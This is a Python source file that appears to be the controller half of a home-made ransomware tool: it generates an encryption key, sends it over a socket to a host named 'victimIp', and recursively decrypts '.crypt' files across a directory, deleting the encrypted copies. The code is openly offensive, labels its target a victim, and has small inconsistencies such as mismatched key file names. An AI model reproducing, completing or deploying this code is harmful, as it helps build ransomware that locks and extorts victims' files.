import os, socket;
from cryptography.fernet import Fernet



def GenerateKey():
    key = Fernet.generate_key()

    with open("./Resources/secret.key", "ab") as keys:
        keys.write(key)





def SendKey(victimIp, port = 9000): 

    # Create Socket
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


    #Establish Connection
    serverAddress = (victimIp, port);
    clientSocket.connect(serverAddress);

    print("Conexion establecida, crea la ruta a traves del paylaod!")


    with open("./Resources/secret.key", "rb") as file:
        key = file.read();



    clientSocket.sendall(key);
    clientSocket.close(); 






def DecryptFile(encryptFilename):

    try: 
        secretKey = open("secrets.key", "rb").read();
        fernet = Fernet(secretKey)


        with open(encryptFilename, "rb") as file:
            data = file.read(); 


        EncryptedData = fernet.decrypt(data);


        with open(encryptFilename.replace(".crypt", ""), "wb") as file:
            file.write(EncryptedData);
        

        os.remove(encryptFilename);
        return True

    except Exception as e:
        print(f"Error! {e}");
        return False; 




def DecryptRoute(route):

    for path, dirs, files in os.walk(route):
        for file in files:
            
            DecryptFile(os.path.join(path, file));

